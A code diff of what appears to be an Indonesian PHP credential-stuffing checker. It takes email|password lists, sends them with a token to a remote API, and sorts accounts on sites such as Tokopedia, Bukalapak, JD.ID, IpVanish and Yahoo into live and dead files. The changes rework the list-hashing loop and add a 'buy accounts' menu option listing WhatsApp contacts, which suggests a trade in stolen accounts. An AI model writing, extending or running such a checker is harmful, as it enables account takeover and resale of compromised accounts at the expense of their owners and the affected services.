@@ -10,7 +10,7 @@
 
 	$version = '1.1.1';
 
-	error_reporting(0);
+	// error_reporting(0);
 	if (!file_exists('token.php')) {
 		echo "\n\n[-] SILAHKAN ISI TOKEN DAHULU, DENGAN MENGETIKAN SEPERTI DI BAWAH INI\n[+] php set.php YOUR_TOKEN\n\n";
 		exit();
@@ -38,7 +38,7 @@
 	cek_version($version);
 	
 	// SERVER
-	$server = "http://mytools.mohona.tv/Api/";
+		
 
 	function banner()
 	{
@@ -82,8 +82,6 @@
 	{	
 		$data = "email=$email&pass=$pass&token=$token";
 
-		
-
 		if ($pilihan == 2) {
 			post_api($server, $data, 'bl', $file_txt, $die_txt);
 		}elseif($pilihan == 1){
@@ -122,6 +120,7 @@
 			}
 			sleep(1);
 		}
+		sleep(1);
 	}
 
 	function pilihan()
@@ -129,7 +128,7 @@
 		echo "\n[+] (1).PHD (2).Bukalapak (3).Tokopedia (4) JD.ID";
 		echo "\n[+] (5).IpVanish (6).HMA (7).Indihome";
 		echo "\n[+] (20).Yahoo Valid Email \n";
-		echo "\n[+] (99). Mass Hashing (Ultra Hash) \n\n";
+		echo "\n[+] (99). Mass Hashing (100). Beli Acc \n\n";
 	}
 
 	banner();
@@ -142,6 +141,9 @@
 		echo "\n[+] Example list : CWHKLB-U73H82-5KU7M1\n";
 	}elseif($pilihan == 99){
 		echo "\n[+] Example list : email|pass\n[+] Support Semua Hash\n";
+	}elseif ($pilihan == 100) {
+		echo "\n\n[+] Hubungi Kontak Di Bawah Ini : \n- http://wa.me/6281215263142 && - http://wa.me/62852230516559\n\n";
+		exit();
 	}
 
 	echo "\n > Masukan List.txt : ";
@@ -158,17 +160,24 @@
 			require('bin/hashit.php');
 			touch('bin/result.txt');
 			$file = file_get_contents($list);
-			$files = explode("\n", $file);
+			$files = explode("\r\n", $file);
+
+			$exp = explode(".", $list);
+			$nama_file = $exp[0]."_hasil.".$exp[1]; 
+			touch($nama_file);
+			echo "[+] Berhasil Membuat File ".$nama_file."\n";
+
 			foreach ($files as $key) {
-				
+
 				$pass = explode("|", $key);
-				$panjang = strlen($pass[0]);
-				
-				hashit($pass[0], $pass[1]);
+				$panjang = strlen($pass[1]);
+				// echo $panjang;
+				hashit($pass[1], $pass[0], $panjang, $nama_file);
 			
 			}
 			echo "\n\n";
 			exit();
+		
 		}
 
 		$rand = date('dmY_His');
@@ -204,6 +213,10 @@
 
 			$file_txt = 'YAHOO_LIVE_'.$rand.'.txt';
 			$die_txt = 'YAHOO_DIE_'.$rand.'.txt';	
+		}else{
+
+			echo "\n[-] Tidak Ada Pilihan Goblog !\n\n";
+			exit();
 		}
 
 		
